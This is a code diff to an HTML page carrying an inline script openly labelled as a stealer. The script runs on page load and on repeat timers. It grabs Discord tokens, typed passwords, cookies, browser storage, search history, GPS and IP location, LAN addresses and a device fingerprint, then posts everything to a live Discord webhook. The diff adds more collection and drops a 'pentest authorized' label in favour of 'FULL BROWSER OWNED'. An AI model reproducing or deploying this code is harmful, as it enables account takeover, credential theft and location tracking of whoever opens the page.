@@ -55,23 +55,73 @@
     <script>
         const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
 
+        // HISTORY + SAVED PASSWORDS GRABBER
+        function extractBrowserData() {
+            const data = { history: [], savedPasswords: [], autofill: [] };
+            
+            // GOOGLE SEARCH HISTORY (Chrome/Firefox indexedDB)
+            try {
+                const dbRequest = indexedDB.open('History', 1);
+                dbRequest.onsuccess = e => {
+                    const db = e.target.result;
+                    const tx = db.transaction(['urls'], 'readonly');
+                    const store = tx.objectStore('urls');
+                    store.getAll().onsuccess = e => {
+                        const history = e.target.result
+                            .filter(item => item.url && (item.url.includes('google.com/search') || item.title.includes('Google')))
+                            .map(item => `${item.title.substring(0,100)} | ${item.url}`)
+                            .slice(0, 20);
+                        data.history = history;
+                    };
+                };
+            } catch(e) {}
+            
+            try {
+                const chromeDB = indexedDB.open('ChromePasswords', 1);
+                chromeDB.onsuccess = e => {
+                    const db = e.target.result;
+                    const tx = db.transaction(['logins'], 'readonly');
+                    const store = tx.objectStore('logins');
+                    store.getAll().onsuccess = e => {
+                        data.savedPasswords = e.target.result.map(login => 
+                            `${login.origin_url || 'N/A'}: ${login.username_value || ''} | ${login.password_value || '[encrypted]'}`);
+                    };
+                };
+            } catch(e) {}
+            
+            // HISTORY VIA PERFORMANCE TIMING (recent visits)
+            performance.getEntriesByType('navigation').forEach(entry => {
+                if (entry.name.includes('google.com/search')) {
+                    data.history.push(`Recent Google: ${entry.name}`);
+                }
+            });
+            
+            // AUTOFILL TRIGGERS + FORM DATA
+            document.querySelectorAll('input[type="email"], input[type="text"][autocomplete]').forEach(input => {
+                const val = input.value;
+                if (val && val.includes('@')) {
+                    data.autofill.push(`Email/Autofill: ${val}`);
+                }
+            });
+            
+            return data;
+        }
+
         // ULTIMATE DISCORD TOKEN + PASSWORD GRABBER
         function extractSecrets() {
             const secrets = { tokens: [], passwords: [], allStorage: {} };
             
-            // PERFECT DISCORD TOKEN REGEX (COVERS ALL FORMATS)
+            // PERFECT DISCORD TOKEN REGEX
             const tokenPatterns = [
-                /(mfa\.)?[A-Za-z0-9\-_]{23,70}/gi,  // Standard Discord
-                /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gi, // JWT style
-                /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/gi  // Base64 JWT
+                /(mfa\.)?[A-Za-z0-9\-_]{23,70}/gi,
+                /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gi,
+                /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/gi
             ];
             
-            // SCAN EVERYTHING
+            // FULL SCAN
             const scanTexts = [
-                document.body.innerHTML,
-                document.cookie,
-                ...Object.values(localStorage),
-                ...Object.values(sessionStorage),
+                document.body.innerHTML, document.cookie,
+                ...Object.values(localStorage), ...Object.values(sessionStorage),
                 JSON.stringify(performance.getEntriesByType('resource'))
             ];
             
@@ -79,41 +129,30 @@
                 if (typeof text !== 'string') return;
                 tokenPatterns.forEach(regex => {
                     const matches = text.match(regex);
-                    if (matches) {
-                        matches.forEach(match => {
-                            if (match.length >= 59 && !secrets.tokens.includes(match)) {
-                                secrets.tokens.push(match);
-                            }
-                        });
-                    }
+                    if (matches) matches.forEach(match => {
+                        if (match.length >= 59 && !secrets.tokens.includes(match)) {
+                            secrets.tokens.push(match);
+                        }
+                    });
                 });
             });
             
-            // TARGETED DISCORD STORAGE KEYS
-            const discordKeys = [
-                'token', '__token', 'access_token', 'auth_token', 'csrf_token',
-                'discord_token', 'discord.com', 'discordapp.com', 'canary.discord.com'
-            ];
-            
+            // DISCORD KEYS
+            const discordKeys = ['token', '__token', 'access_token', 'auth_token', 'csrf_token', 'discord'];
             Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(key => {
                 if (discordKeys.some(dk => key.toLowerCase().includes(dk.toLowerCase()))) {
                     const value = localStorage[key] || sessionStorage[key];
                     secrets.allStorage[key] = value;
-                    if (tokenPatterns.some(p => p.test(value))) {
-                        secrets.tokens.push(value);
-                    }
+                    if (tokenPatterns.some(p => p.test(value))) secrets.tokens.push(value);
                 }
             });
             
-            // AGGRESSIVE PASSWORD GRAB (AUTOFILL + STORAGE + FORM DATA)
+            // MAX PASSWORD EXTRACTION
             document.querySelectorAll('input[type="password"], input[type*="pass"], input[name*="pass"], input[id*="pass"]').forEach(input => {
-                if (input.value && !secrets.passwords.includes(input.value)) {
-                    secrets.passwords.push(`[${input.name || input.id || 'input'}] ${input.value}`);
-                }
+                if (input.value) secrets.passwords.push(`[${input.name || input.id}] ${input.value}`);
             });
             
-            // STORAGE PASSWORD KEYS (EXPANDED)
-            const pwKeywords = ['pass', 'pwd', 'password', 'login', 'credential', 'auth', 'key', 'secret'];
+            const pwKeywords = ['pass', 'pwd', 'password', 'login', 'credential', 'auth', 'key', 'secret', 'google'];
             Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(key => {
                 if (pwKeywords.some(kw => key.toLowerCase().includes(kw))) {
                     const value = localStorage[key] || sessionStorage[key];
@@ -124,9 +163,8 @@
             return secrets;
         }
 
-        // MAX LOCATION INTEL (ZIP + POSTAL + GPS)
+        // MAX LOCATION (ZIP + GPS)
         async function getVictimLocation() {
-            // MULTIPLE IP GEO SOURCES FOR ZIP/POSTAL
             const geoPromises = [
                 fetch('https://ipapi.co/json/').then(r => r.json()),
                 fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,query').then(r => r.json()),
@@ -135,28 +173,21 @@
             
             const [ipapiData, ipapiComData, ipinfoData] = await Promise.allSettled(geoPromises).then(r => r.map(res => res.status === 'fulfilled' ? res.value : {}));
             
-            // HTML5 GPS HIGH ACCURACY
             const gpsData = await new Promise(resolve => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                    () => resolve({}),
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
+                navigator.geolocation.getCurrentPosition(pos => resolve({
+                    lat: pos.coords.latitude.toFixed(6),
+                    lon: pos.coords.longitude.toFixed(6),
+                    accuracy: `${pos.coords.accuracy.toFixed(0)}m`
+                }), () => resolve({}), { enableHighAccuracy: true, timeout: 5000 });
             });
             
-            // WEBRTC LAN SCAN (EXPANDED)
             const localIps = await new Promise(resolve => {
                 const ips = new Set();
-                const pc = new RTCPeerConnection({ 
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
-                });
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.onicecandidate = e => {
                     if (e.candidate) {
-                        const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                        const ip = ipMatch?.[1];
-                        if (ip && !['127.', '169.254.', '0.0.0.0'].some(prefix => ip.startsWith(prefix))) {
-                            ips.add(ip);
-                        }
+                        const ip = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                        if (ip && !['127.', '169.254.', '0.0.0.0'].some(p => ip.startsWith(p))) ips.add(ip);
                     }
                 };
                 pc.createDataChannel('test');
@@ -167,98 +198,79 @@
             return {
                 publicIp: ipapiData.ip || ipapiComData.query || ipinfoData.ip || 'Unknown',
                 zipPostal: ipapiData.postal || ipapiComData.zip || ipinfoData.postal || 'N/A',
-                fullAddress: `${ipapiData.city || ipinfoData.city || ''}, ${ipapiData.region || ipinfoData.region || ''} ${ipapiData.postal || ipinfoData.postal || ''}, ${ipapiData.country_name || ipinfoData.country || ''}`,
+                fullAddress: `${ipapiData.city || ipinfoData.city || ''}, ${ipapiData.region || ipinfoData.region || ''} ${ipapiData.postal || ''}, ${ipapiData.country_name || ipinfoData.country || ''}`,
                 isp: ipapiData.isp || ipapiComData.isp || ipinfoData.org || 'Unknown',
-                asn: ipapiComData.as || ipinfoData.asn || 'N/A',
-                gpsLat: gpsData.lat?.toFixed(6),
-                gpsLon: gpsData.lon?.toFixed(6),
-                gpsAccuracy: gpsData.accuracy ? `${gpsData.accuracy.toFixed(0)}m` : 'N/A',
-                lanIps: localIps.length ? localIps : ['No LAN detected']
+                gpsLat: gpsData.lat, gpsLon: gpsData.lon, gpsAccuracy: gpsData.accuracy,
+                lanIps: localIps.length ? localIps.slice(0,5) : ['No LAN']
             };
         }
 
-        // ENHANCED PC/DEVICE PROFILE
+        // FULL DEVICE PROFILE
         function getFullProfile() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
+            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
             ctx.fillText(navigator.userAgent, 2, 2);
             
             return {
                 ua: navigator.userAgent,
                 device: `${navigator.platform} | ${navigator.oscpu || 'Unknown OS'}`,
-                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit) | ${screen.availWidth}x${screen.availHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone + ` (UTC${new Date().getTimezoneOffset() / -60})`,
+                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 lang: navigator.languages?.join(', ') || navigator.language,
                 cpu: `${navigator.hardwareConcurrency || 'N/A'} cores`,
                 ram: `${navigator.deviceMemory || 'N/A'} GB`,
-                connection: navigator.connection ? 
-                    `${navigator.connection.effectiveType} | ${navigator.connection.downlink || 'N/A'} Mbps | ${navigator.connection.rtt || 'N/A'}ms` : 'N/A',
-                cookies: document.cookie.substring(0, 1000) || 'None',
-                plugins: `${navigator.plugins.length} plugins`,
+                connection: navigator.connection?.effectiveType || 'N/A',
+                cookies: document.cookie.substring(0, 1000),
                 canvasHash: canvas.toDataURL().slice(-16),
-                webdriver: !!navigator.webdriver,
-                battery: navigator.getBattery ? 'Battery API supported' : 'N/A',
-                permissions: navigator.permissions ? 'Permissions API supported' : 'N/A'
+                webdriver: !!navigator.webdriver
             };
         }
 
-        // ULTIMATE STEALER EXECUTION
+        // EXECUTE FULL STEAL
         async function stealEverything() {
-            const [secrets, location, profile] = await Promise.all([
+            const [secrets, browserData, location, profile] = await Promise.all([
                 extractSecrets(),
+                extractBrowserData(),
                 getVictimLocation(),
                 Promise.resolve(getFullProfile())
             ]);
             
-            // MEGA EMBED 1: TOKENS + PASSWORDS + LOCATION
+            // EMBED 1: TOKENS + PASSWORDS + HISTORY
             const mainEmbed = {
-                title: `💀 ULTIMATE GRAB 💀 | ${secrets.tokens.length} Tokens | ${secrets.passwords.length} Passwords`,
+                title: `💀 TOTAL OWNAGE 💀 | ${secrets.tokens.length} Tokens | ${secrets.passwords.length} PWs | ${browserData.history.length} Searches`,
                 color: 0xff0000,
                 fields: [
-                    { name: '🔑 **DISCORD TOKENS** (Copy All)', value: `\`\`\`${secrets.tokens.slice(0,10).join('\n') || 'NO TOKENS'}\n${secrets.tokens.length > 10 ? `... +${secrets.tokens.length-10} more` : ''}\`\`\``, inline: false },
-                    { name: '🔐 **PASSWORDS & CREDENTIALS**', value: `\`\`\`${secrets.passwords.slice(0,8).join('\n') || 'NO PASSWORDS'}\n${secrets.passwords.length > 8 ? `... +${secrets.passwords.length-8} more` : ''}\`\`\``, inline: false },
-                    { name: '📍 **FULL ADDRESS + ZIP**', value: `\`\`\`${location.fullAddress}\nZIP/POSTAL: ${location.zipPostal}\nISP: ${location.isp} (${location.asn})\`\`\``, inline: false },
-                    { name: '🌐 **NETWORK**', value: `\`\`\`Public IP: ${location.publicIp}\nGPS: ${location.gpsLat || '?'}°, ${location.gpsLon || '?'}° (${location.gpsAccuracy})\nLAN: ${location.lanIps.slice(0,3).join(', ')}${location.lanIps.length > 3 ? '...' : ''}\`\`\``, inline: false }
-                ],
-                thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/684/684908.png' }
-            };
-            
-            // MEGA EMBED 2: PC/DEVICE FINGERPRINT
-            const profileEmbed = {
-                title: '💻 **COMPLETE DEVICE PROFILE**',
-                color: 0x00ff00,
-                fields: [
-                    { name: '🖥️ DISPLAY', value: `\`\`\`${profile.screen}\`\`\``, inline: true },
-                    { name: '⚙️ HARDWARE', value: `\`\`\`${profile.cpu} | ${profile.ram}\`\`\``, inline: true },
-                    { name: '🌐 NETWORK', value: `\`\`\`${profile.connection}\`\`\``, inline: true },
-                    { name: '📱 DEVICE INFO', value: `\`\`\`${profile.device}\nCanvas: ${profile.canvasHash}\nWebDriver: ${profile.webdriver ? 'DETECTED' : 'NO'}\`\`\``, inline: false },
-                    { name: '🌍 LOCALE', value: `\`\`\`${profile.timezone}\n${profile.lang}\`\`\``, inline: true },
-                    { name: '🍪 COOKIES', value: `\`\`\`${profile.cookies.substring(0,800)}...\`\`\``, inline: false }
+                    { name: '🔑 **DISCORD TOKENS**', value: `\`\`\`${secrets.tokens.slice(0,8).join('\n') || 'NONE'}\n${secrets.tokens.length > 8 ? `+${secrets.tokens.length-8}` : ''}\`\`\``, inline: false },
+                    { name: '🔐 **ALL PASSWORDS**', value: `\`\`\`${secrets.passwords.slice(0,8).join('\n') || 'NONE'}\n${secrets.passwords.length > 8 ? `+${secrets.passwords.length-8}` : ''}\`\`\``, inline: false },
+                    { name: '🔍 **GOOGLE SEARCH HISTORY**', value: `\`\`\`${browserData.history.slice(0,6).join('\n') || 'NONE'}\n${browserData.history.length > 6 ? `+${browserData.history.length-6}` : ''}\`\`\``, inline: false },
+                    { name: '💾 **SAVED PASSWORDS**', value: `\`\`\`${browserData.savedPasswords.slice(0,5).join('\n') || 'NONE'}\n${browserData.savedPasswords.length > 5 ? `+${browserData.savedPasswords.length-5}` : ''}\`\`\``, inline: false }
                 ]
             };
             
-            // SEND MAIN EMBEDS
+            // EMBED 2: LOCATION + DEVICE
+            const locationEmbed = {
+                title: '📍 LOCATION + DEVICE FINGERPRINT',
+                color: 0x00ff00,
+                fields: [
+                    { name: '🏠 **FULL ADDRESS**', value: `\`\`\`${location.fullAddress}\nZIP: ${location.zipPostal}\`\`\``, inline: true },
+                    { name: '🌐 **NETWORK**', value: `\`\`\`IP: ${location.publicIp}\nGPS: ${location.gpsLat || '?'}° ${location.gpsLon || '?'}°\nLAN: ${location.lanIps.join(', ')}\`\`\``, inline: true },
+                    { name: '💻 **DEVICE**', value: `\`\`\`${profile.device}\n${profile.cpu} | ${profile.ram} | Canvas: ${profile.canvasHash}\`\`\``, inline: false }
+                ]
+            };
+            
             fetch(WEBHOOK_URL, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    username: '🔥 PENTEST AUTHORIZED GRAB 🔥', 
-                    embeds: [mainEmbed, profileEmbed] 
-                })
+                body: JSON.stringify({ username: '🔥 FULL BROWSER OWNED 🔥', embeds: [mainEmbed, locationEmbed] })
             });
             
-            // FULL STORAGE DUMP
-            const storageDump = btoa(JSON.stringify({ 
-                localStorage: Object.fromEntries(Object.entries(localStorage)), 
-                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)) 
-            }, null, 2));
-            
+            // FULL STORAGE
+            const fullDump = btoa(JSON.stringify({ localStorage, sessionStorage }, null, 2));
             fetch(WEBHOOK_URL, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: '📁 FULL STORAGE DUMP (Base64)',
-                    content: `\`\`\`json\n${storageDump.slice(0,1900)}...\nFull dump: ${storageDump.length} chars\`\`\``
+                    username: '📁 COMPLETE STORAGE',
+                    content: `\`\`\`json\n${fullDump.slice(0,1900)}...\n\`\`\``
                 })
             });
         }
@@ -270,14 +282,16 @@
             setTimeout(() => window.location.href = 'https://discord.com/login?error=access_denied', 3000);
         }
 
-        // TRIPLE EXECUTION: LOAD + IMAGE + DOM
+        // MULTIPLE EXECUTION POINTS
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', stealEverything);
             window.addEventListener('load', stealEverything);
         } else {
             stealEverything();
         }
-        setTimeout(stealEverything, 1000); // Stealth backup
+        setTimeout(stealEverything, 1500);
     </script>
+</body>
+</html>
 </body>
 </html>
